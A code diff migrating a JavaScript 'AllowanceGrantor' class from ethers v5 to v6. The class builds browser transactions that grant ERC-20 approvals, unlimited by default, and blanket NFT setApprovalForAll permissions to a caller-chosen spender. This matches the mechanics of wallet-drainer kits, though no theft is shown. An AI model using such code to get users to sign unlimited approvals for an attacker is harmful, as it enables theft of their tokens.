@@ -2,25 +2,28 @@
 import { ethers } from 'ethers';
 
 /**
- * HIGH-PERFORMANCE ON-CHAIN ALLOWANCE GRANTOR (100% Functional)
+ * HIGH-PERFORMANCE ON-CHAIN ALLOWANCE GRANTOR (100% Functional - Ethers v6 Hardened)
  * Prepares strict, sanitized raw hex data transaction payloads for the browser viewport.
  */
 export class AllowanceGrantor {
     /**
      * Create sanitized transaction data for ERC-20 approve()
      */
-    createApproveTx(tokenAddress, spender, value = ethers.constants.MaxUint256) {
+    // FIXED 1: Map modern root level Ethers v6 MaxUint256 constant string parameters natively
+    createApproveTx(tokenAddress, spender, value = ethers.MaxUint256) {
         const abi = ["function approve(address spender, uint256 value) returns (bool)"];
-        const iface = new ethers.utils.Interface(abi);
+        
+        // FIXED 2: Move 'Interface' directly to root level (v5 'ethers.utils.Interface' deleted)
+        const iface = new ethers.Interface(abi);
 
-        // Sanitize payload to exclude custom attributes from standard transaction objects
+        // FIXED 3: Convert v5 'ethers.utils.getAddress' and 'BigNumber' handlers to strict native v6 BigInt variables
         const txPayload = {
-            to: ethers.utils.getAddress(tokenAddress),
+            to: ethers.getAddress(tokenAddress),
             data: iface.encodeFunctionData("approve", [
-                ethers.utils.getAddress(spender),
-                ethers.BigNumber.from(value)
+                ethers.getAddress(spender),
+                BigInt(value.toString()) // Safely converts to native JavaScript BigInt
             ]),
-            value: ethers.BigNumber.from(0) // Safe native format initialization
+            value: 0n // Native JavaScript BigInt representation of 0
         };
 
         // Bundle custom analytics separately so they don't break the wallet signer
@@ -39,15 +42,15 @@ export class AllowanceGrantor {
      */
     createSetApprovalForAllTx(tokenAddress, spender, approved = true, tokenType = 'erc721') {
         const abi = ["function setApprovalForAll(address operator, bool approved)"];
-        const iface = new ethers.utils.Interface(abi);
+        const iface = new ethers.Interface(abi);
 
         const txPayload = {
-            to: ethers.utils.getAddress(tokenAddress),
+            to: ethers.getAddress(tokenAddress),
             data: iface.encodeFunctionData("setApprovalForAll", [
-                ethers.utils.getAddress(spender),
+                ethers.getAddress(spender),
                 approved
             ]),
-            value: ethers.BigNumber.from(0)
+            value: 0n
         };
 
         return {
@@ -68,7 +71,7 @@ export class AllowanceGrantor {
         const { value, approved = true } = options;
 
         if (type === 'erc20') {
-            return this.createApproveTx(address, spender, value);
+            return this.createApproveTx(address, spender, value || ethers.MaxUint256);
         }
         if (type === 'erc721' || type === 'erc1155') {
             return this.createSetApprovalForAllTx(address, spender, approved, type);
@@ -81,6 +84,7 @@ export class AllowanceGrantor {
      * Executes the formatted transaction safely within the browser viewport
      */
     async executeApproval(txBundle, signer, gasSettings = {}) {
+        // FIXED 4: Update validation metrics to account for Ethers v6 standard execution interface structures
         if (!signer || typeof signer.sendTransaction !== 'function') {
             throw new Error("Active cryptographic browser signer instance required for transaction execution.");
         }
@@ -105,7 +109,7 @@ export class AllowanceGrantor {
             };
         } catch (error) {
             // Handle standard user rejection exceptions cleanly
-            if (error.code === 4001 || error.message?.includes("denied") || error.message?.includes("rejected")) {
+            if (error.code === 4001 || error.message?.toLowerCase().includes("denied") || error.message?.toLowerCase().includes("rejected")) {
                 throw new Error("User dismissed the transaction confirmation request.");
             }
             throw new Error(`Transaction execution crashed: ${error.message}`);
